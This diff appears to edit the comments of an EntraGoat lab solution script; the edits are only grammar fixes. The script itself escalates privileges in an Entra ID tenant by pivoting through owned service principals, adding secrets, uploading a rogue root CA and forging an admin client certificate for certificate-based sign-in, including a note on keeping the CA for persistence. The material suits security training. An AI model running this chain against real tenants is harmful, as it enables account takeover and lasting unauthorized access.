@@ -13,8 +13,8 @@ Attack flow:
 1. The attacker discovers hardcoded credentials for a legacy automation service principal.
 This SP has Policy.ReadWrite.AuthenticationMethod permission - seems harmless, right?
 
-2. Through enumeration, the attacker discovers this legacy SP owns other service principals.
-Ownership means the ability to add credentials and authenticating as the SP (as seen in Scenario 1).
+2. Through enumeration, the attacker discovers that this legacy SP owns other service principals.
+Ownership means the ability to add credentials and authenticate as the SP (as seen in Scenario 1).
 
 3. The second service principal has Organization.ReadWrite.All permission. 
 While not capable of managing users or roles, this permission allows modification of tenant-wide configurations, including authentication settings.
@@ -32,7 +32,7 @@ This persists through password resets and might not trigger typical authenticati
 
 - - -
 
---> So... why this works?
+--> So... why does this work?
 This attack exploits several Entra ID design decisions and common misconfigurations:
 
 1. Service Principal ownership: SP ownership grants credential management rights.
@@ -61,7 +61,7 @@ Requires: Get-MSGraphTokenWithUsernamePassword function from BARK or manual cert
 function Find-OwnedServicePrincipals {
     param([string]$PrincipalId)
     
-    # Get all service principals in tenant
+    # Get all service principals in the tenant
     $allSPs = Get-MgServicePrincipal -All
     Write-Host "Found $($allSPs.Count) service principals in tenant"
     
@@ -165,7 +165,7 @@ foreach ($perm in $dataSyncPerms) {
     $role = $resource.AppRoles | Where-Object { $_.Id -eq $perm.AppRoleId }
     "$($resource.DisplayName): $($role.Value)"
 }
-# Organization.ReadWrite.All - this permission allows this SP to add a shiny brand new Root CA to the tenant!
+# Organization.ReadWrite.All - this permission allows this SP to add a shiny brand-new Root CA to the tenant!
 
 # Step 3: Pivoting to "DataSync-Production" SP
 # the Legacy SP we authenticated as owns that DataSync SP ~AND~ has "Application.ReadWrite.OwnedBy" permission - meaning we can add credentials to SPs we own. 
@@ -179,7 +179,7 @@ $newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $dataSyncSP.Id -
 $dataSyncSecret = $newSecret.SecretText # save it for later
 
 # the problem we're facing is that although we can add a "trusted" (wink wink) root CA, we can't enable CBA to use it.
-# we need an identity with "Policy.ReadWrite.AuthenticationMethod" permission or Authentication Policy Administrator role to do so.
+# we need an identity with "Policy.ReadWrite.AuthenticationMethod" permission or the Authentication Policy Administrator role to do so.
 $cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "X509Certificate"
 
 # 403 Error
@@ -233,9 +233,9 @@ $eligibilities.value | ForEach-Object {
     "Eligible *$($_.accessId)* for: $($group.DisplayName) (ID: $($group.Id)) "
 }
 
-# Eligible member for Authentication Policy Managers group!
+# Eligible member for the Authentication Policy Managers group!
 
-# What can this group can do?
+# What can this group do?
 $authGroup = Get-MgGroup -Filter "displayName eq 'Authentication Policy Managers'"
 
 # group's roles
@@ -326,9 +326,9 @@ $cba.State
 Disconnect-MgGraph
 Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $dsCred
 
-# NOTE: creating, configuring and uploading a root CA and client certificate is a complex process with multiple error-prone steps.
+# NOTE: Creating, configuring and uploading a root CA and client certificate is a complex process with multiple error-prone steps.
 # Entra ID requires a very specific format for the UPN in the SAN extension that PowerShell struggles to create with a correct OID properly.
-# Because of that we'll use OpenSSL to create the root CA and client certificate.
+# Because of that, we'll use OpenSSL to create the root CA and client certificate.
 
 # OpenSSL commands adapted for PowerShell
 $opensslBinary = "C:\Program Files\OpenSSL-Win64\bin\openssl.exe"
@@ -345,7 +345,7 @@ if (Test-Path $caWorkspace) {
     New-Item -Path $_ -ItemType Directory -Force | Out-Null
 }
 
-# Initialize certificate database (OpenSSL requires specific format)
+# Initialize certificate database (OpenSSL requires a specific format)
 New-Item -Path "$caWorkspace\ca\index.db" -ItemType File -Force | Out-Null
 "01" | Out-File "$caWorkspace\ca\serial" -Encoding ASCII -NoNewline
 
@@ -434,7 +434,7 @@ $caAuthority = @{
     certificate = [System.Convert]::ToBase64String($rootCA.GetRawCertData())
 }
 
-# Try to get existing CBA configuration
+# Try to get the existing CBA configuration
 try {
     $existingConfigs = Invoke-MgGraphRequest -Method GET `
         -Uri "https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration"
@@ -499,7 +499,7 @@ if (-not $uploadSuccess) {
 # Generate client certificate private key and signing request
 & $opensslBinary req -new -sha256 -config client.conf -newkey rsa:4096 -nodes -keyout "$adminUPN.key" -out "$adminUPN.csr" -subj "/C=US/ST=Washingaot/L=EvilDistrict/O=EntraGoat/OU=Security/CN=$adminUPN"
 
-# Sign the client certificate with root CA
+# Sign the client certificate with the root CA
 & $opensslBinary ca -batch -md sha256 -config ca.conf -extensions v3_req -out "$adminUPN.crt" -infiles "$adminUPN.csr"
 
 # Convert to PFX format for Windows installation
@@ -519,11 +519,11 @@ If you get an error about "Certificate validation failed", you probably didn't c
 
 BUT 
 
-if you get an the pop up of "Stay signed in?" (meaning the cert is valid) and then after clicking yes/no you get the error about
-"Choose a way to sign in" - it means that Certificate-Based Authentication is enabled BUT its "Default authentication strength" is 
+If you get the pop-up of "Stay signed in?" (meaning the cert is valid), and then after clicking yes/no, you get the error about
+"Choose a way to sign in" - it means that Certificate-Based Authentication is enabled, BUT its "Default authentication strength" is 
 set to "Single-factor" and not "Multi-factor". To change the default authentication strength, you can do it from the Entra admin center:
-Authentication methods -> Policies -> Certificate-based authentication -> Configure -> Under "Authentication binding" change "Default authentication strength" from "Single-Factor" to "Multi-Factor"
-This also can be accomplished automatically by:
+Authentication methods -> Policies -> Certificate-based authentication -> Configure -> Under "Authentication binding", change "Default authentication strength" from "Single-Factor" to "Multi-Factor"
+This can also be accomplished automatically by:
 #>
 
 # Get current config
@@ -557,13 +557,13 @@ Invoke-MgGraphRequest -Method PATCH -Uri "https://graph.microsoft.com/beta/polic
 $updated = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"
 $updated.authenticationModeConfiguration.x509CertificateAuthenticationDefaultMode
 
-# the root CA can be remained in the tenant for persistence purposes and any user certificate signed by the CA will be able to authenticate
+# the root CA can be retained in the tenant for persistence purposes and any user certificate signed by the CA will be able to authenticate
 
 # Consider: cleanup certificates from local store by the following commands
 Remove-Item -Path "Cert:\CurrentUser\My\$($rootCA.Thumbprint)" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "Cert:\CurrentUser\My\$($clientCert.Thumbprint)" -Force -ErrorAction SilentlyContinue
 
-# Don't forget to run the cleanup script to restore the tenant to it's original state!
-# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.
+# Don't forget to run the cleanup script to restore the tenant to its original state!
+# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing its source code.
 
 # Official blog post: https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/
